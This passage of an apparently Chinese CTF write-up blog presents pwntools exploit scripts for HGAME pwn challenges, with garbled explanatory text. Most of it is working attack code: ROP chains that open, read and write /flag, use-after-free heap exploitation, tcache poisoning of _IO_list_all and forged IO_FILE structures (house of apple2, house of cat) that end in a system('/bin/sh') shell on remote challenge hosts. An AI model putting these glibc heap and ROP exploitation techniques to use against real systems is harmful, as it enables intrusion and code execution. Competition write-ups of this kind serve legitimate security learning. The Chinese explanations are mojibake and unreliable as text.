libc.sym[&#x27;write&#x27;]</span><br><span class="line">mprotect=libc_base + libc.sym[&#x27;mprotect&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Good luck.\n&quot;)</span><br><span class="line">pay3=(p64(rsi)+p64(0x404530)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(0x4013D2)+b&#x27;/flag\x00\x00\x00&#x27;).ljust(0x50,b&#x27;\x00&#x27;)+p64(0x4040dc-8)+p64(leave_ret)</span><br><span class="line">#bug()</span><br><span class="line">s(pay3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">flag=0x404530</span><br><span class="line">stack=0x404130+0x500</span><br><span class="line">orw = b&#x27;/flag\x00\x00\x00&#x27;+p64(rdi) + p64(flag)  #/flagçš„å­—ç¬¦ä¸²ä½ç½®ï¼Œè¦æ”¹</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(5)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(4)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(0x404530)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">pay3=(p64(rsi)+p64(bss)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(bss)).ljust(0x50,b&#x27;\x00&#x27;)+p64(0x4040d4-8)+p64(leave_ret)</span><br><span class="line">bug()</span><br><span class="line">s(pay3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag=0x40420c</span><br><span class="line">stack=0x404130+0x500</span><br><span class="line">orw = p64(rdi) + p64(flag)  #/flagçš„å­—ç¬¦ä¸²ä½ç½®ï¼Œè¦æ”¹</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(write)+b&#x27;/flag\x00\x00\x00&#x27;</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="Hit-list"><a href="#Hit-list" class="headerlink" title="Hit list"></a>Hit list</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885361131-33186b5c-db0e-40ce-9e3c-267086d332f2.png" alt=""></p><p>add</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885486359-3b37c093-c360-4c0c-9ff7-7708bb2258df.png" alt=""></p><p>edit</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885533118-d0e39e18-15e9-4447-b26a-898efb9b5992.png" alt=""></p><p>gift</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885409779-7bcccd44-5ef0-48f8-a84e-ad64ab8650b3.png" alt=""></p><p>å…¸èœå•å †é¢˜ï¼Œæ¼æ´ç‚¹uaf</p><p>addé™åˆ¶å †å—å¤§å°&lt;=0x3f0ï¼Œè¿™æ ·å°±ä¸èƒ½è¿›è¡Œlargerbin attackäº†ï¼Œæ¯æ¬¡ç”³è¯·å †å—ä¼šç”³è¯·0x20çš„ä¿¡æ¯å †å—</p><p>åŒæ—¶ç»™å‡ºgiftï¼Œå¯ä»¥ä»»æ„åœ°å€freeï¼Œè§¦å‘æ¡ä»¶æ˜¯malloc(0)</p><p>editæ˜¯å…ˆå°†å †å—freeä¹‹ååˆ©ç”¨ç”³è¯·å †å—çš„éƒ¨åˆ†å°†å †å—å†æ¬¡ç”³è¯·å‡ºæ¥å†™å…¥</p><p>é¦–å…ˆå°±æ˜¯æ³„éœ²å †åœ°å€ï¼Œç”³è¯·ä¸¤ä¸ªå…±åŒå¤§å°çš„å †å—ï¼Œé‡Šæ”¾åç”³è¯·0x20å¤§å°çš„å †å—ï¼Œå°±å¯ä»¥å¾—åˆ°å †åœ°å€</p><p>å…¶æ¬¡æ˜¯æ³„éœ²libcåœ°å€ï¼Œé‡Šæ”¾å¤§äº0x88çš„å †å—ï¼Œå…ˆå°†tcachebinæ·»æ…¢ï¼Œä¸­é—´0x30çš„å †å—å¦‚æœæ»¡çš„è¯æ²¡åŠæ³•freeï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·0x20çš„å †å—å†æ¬¡é‡Šæ”¾ï¼Œå°±å¯ä»¥æ‹¿åˆ°libcåœ°å€</p><p>æœ€åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå¤§å †å—ï¼Œä¼ªé€ å¥½åˆé€‚çš„sizeï¼Œåˆ©ç”¨giftå°†ä¼ªé€ çš„å †å—é‡Šæ”¾ï¼Œä¹‹åeditå¤§å †å—å°±å¯ä»¥å®Œæˆtcachebin attackï¼Œæ”»å‡»IO_list_allï¼Œå†™å…¥æˆ‘ä»¬ä¼ªé€ fake_ioçš„å †åœ°å€ï¼Œèµ°house of apple2ï¼Œexité€€å‡ºè§¦å‘getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,32272)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size,content):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(b&#x27;a&#x27;*7)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def edit(i,name,size,content):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(name)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(2,0x68,b&#x27;a&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(3,0x20,b&#x27;a&#x27;*(0x10))</span><br><span class="line">show(1)</span><br><span class="line">rl(&quot;Information: aaaaaaaaaaaaaaaa&quot;)</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x2d0</span><br><span class="line">li(hex(heap_base))</span><br><span class="line">free(1)</span><br><span class="line">add(0,0x20,b&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(2,0x68,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">add(i+3,0x90,b&#x27;a&#x27;)</span><br><span class="line">for i in range(7):</span><br><span class="line">free(i+3)</span><br><span class="line">add(21,0x20,b&#x27;a&#x27;)</span><br><span class="line">free(11)</span><br><span class="line">free(13)</span><br><span class="line">add(22,0x38,b&#x27;a&#x27;)#16</span><br><span class="line">show(16)</span><br><span class="line">libc_base=get_addr64()-2207073</span><br><span class="line">li(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]-0x10</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">add(23,0x40,b&#x27;a&#x27;)#17</span><br><span class="line">add(24,0x100,b&#x27;\x00&#x27;*0x30+p64(0x81)+b&#x27;a&#x27;*8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#add(25,-10,hex(heap_base+0x950))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(25))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(b&#x27;a&#x27;*7)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(-10))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(hex(heap_base+0x1590))</span><br><span class="line">IO_list_all_xor=(heap_base+0x1590&gt;&gt;12)^IO_list_all</span><br><span class="line">edit(18,b&#x27;a&#x27;,0x100,b&#x27;\x00&#x27;*(0x30)+p64(0x81)+p64(IO_list_all_xor))</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk3=heap_base+0x1660-0x8 # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">fake_ret=chunk3+0xe0+0xe0+0x18</span><br><span class="line"></span><br><span class="line">IO_FILE1 = p64(0)*3+p64(1)+b&#x27;\x00&#x27;*0x38+p64(0)                         #_chain</span><br><span class="line">IO_FILE1+= p32(0)+b&#x27;\x08&#x27;                                              #_flags2</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0x80,b&#x27;\x00&#x27;)+p64(chunk3)                    #lock</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0x90,b&#x27;\x00&#x27;)+p64(chunk3+0xe0)               #_wide_data  ***  rdx</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0xb0,b&#x27;\x00&#x27;)</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0xc8,b&#x27;\x00&#x27;)+p64(_IO_wfile_jumps)           #vtable</span><br><span class="line"></span><br><span class="line">IO_FILE1+= b&#x27;\x00&#x27;.ljust(0xa0,b&#x27;\x00&#x27;)+p64(fake_ret)+p64(rdi+1)</span><br><span class="line">IO_FILE1+= b&#x27;/flag\x00\x00\x00&#x27;.ljust(0x30,b&#x27;\x00&#x27;)+p64(chunk3+0xe0+0xe8-0x68)+p64(setcontext+61)</span><br><span class="line">IO_FILE1+= p64(rdi+1)*2+shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(25,0x68,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">add(26,0x3f0,IO_FILE1)</span><br><span class="line">add(27,0x68,b&#x27;\x00&#x27;*8+p64(chunk3))</span><br><span class="line"></span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(5))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="Where-is-the-vulnerability"><a href="#Where-is-the-vulnerability" class="headerlink" title="Where is the vulnerability"></a>Where is the vulnerability</h4><p>èœå•å †é¢˜ï¼Œ2.39</p><p>add,edit,free,showå››ä¸ªåŠŸèƒ½æ­£å¸¸</p><p>å­˜åœ¨uafæ¼æ´ï¼Œè¿™é‡Œç›´æ¥èµ°house of catå°±è¡Œ</p><p>å­˜åœ¨æ²™ç›’ï¼Œèµ°orw</p><p>ä¸‰ä¸ªåº“patchä¸€ä¸‹å°±è¡Œï¼Œä¸è¦å¿˜äº†æ›´æ”¹æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 è·¯å¾„  æ–‡ä»¶</span><br><span class="line">patchelf --replace-needed libhgame.so è·¯å¾„  æ–‡ä»¶</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so è·¯å¾„ æ–‡ä»¶</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31346)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line"></span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">add(0,0x520) #0</span><br><span class="line">add(1,0x558) #1</span><br><span class="line">add(2,0x510) #2</span><br><span class="line">add(3,0x550) #3</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_base=get_addr64()-2112288</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+0x0000000000066b9a</span><br><span class="line">#rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">add(4,0x600)</span><br><span class="line">edit(0,b&#x27;a&#x27;*(0x10))</span><br><span class="line">show(0)</span><br><span class="line">rl(b&#x27;a&#x27;*(0x10))</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x290</span><br><span class="line">li(hex(heap_base))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">edit(0,p64(libc_base+2113360)*2+p64(heap_base+0x290)+p64(IO_list_all-0x20))</span><br><span class="line">add(5,0x600)</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk3=heap_base+0xd20 # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line">fake_IO_FILE  =p64(0)*2+p64(1)+p64(chunk3+0x8)  </span><br><span 